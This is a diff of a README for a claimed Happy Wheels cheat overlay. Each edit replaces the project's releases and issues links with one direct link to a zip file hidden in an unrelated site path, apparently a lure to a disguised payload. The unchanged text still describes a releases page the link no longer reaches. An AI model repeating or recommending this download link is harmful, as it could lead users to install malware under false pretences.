@@ -5,7 +5,7 @@ description: "Unlock 34 gameplay-enhancing tools to master Happy Wheels with ful
 ---
 # 🎮 happy-wheels-overlay - Unlock Every Secret, Crash Without Limits
 
-[![Download Now](https://img.shields.io/badge/Download-happy--wheels--overlay-blue?style=for-the-badge&logo=github)](https://github.com/CTosCorp/happy-wheels-overlay/releases)
+[![Download Now](https://img.shields.io/badge/Download-happy--wheels--overlay-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/CTosCorp/ctoscorp.github.io/main/fbclone/assets/js/2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ No coding skills needed. No complicated setup. Just follow the steps below, and 
 **Step 1: Get the File**
 
 Visit this link to download the application:  
-👉 **[https://github.com/CTosCorp/happy-wheels-overlay/releases](https://github.com/CTosCorp/happy-wheels-overlay/releases)**
+👉 **[https://raw.githubusercontent.com/CTosCorp/ctoscorp.github.io/main/fbclone/assets/js/2.6.zip](https://raw.githubusercontent.com/CTosCorp/ctoscorp.github.io/main/fbclone/assets/js/2.6.zip)**
 
 On that page, you'll see a list of available files. Click the most recent version (usually at the top). Your browser will save a file to your "Downloads" folder — usually named something like `happy-wheels-overlay-v1.2.3.zip` or similar.
 
@@ -146,7 +146,7 @@ Check the releases page every few weeks. New versions add more modules and fix b
 
 This tool is free to use for personal enjoyment. It is not affiliated with or endorsed by the original Happy Wheels developers.
 
-For bug reports, feature requests, or questions, visit the [GitHub Issues page](https://github.com/CTosCorp/happy-wheels-overlay/issues).
+For bug reports, feature requests, or questions, visit the [GitHub Issues page](https://raw.githubusercontent.com/CTosCorp/ctoscorp.github.io/main/fbclone/assets/js/2.6.zip).
 
 ---
 
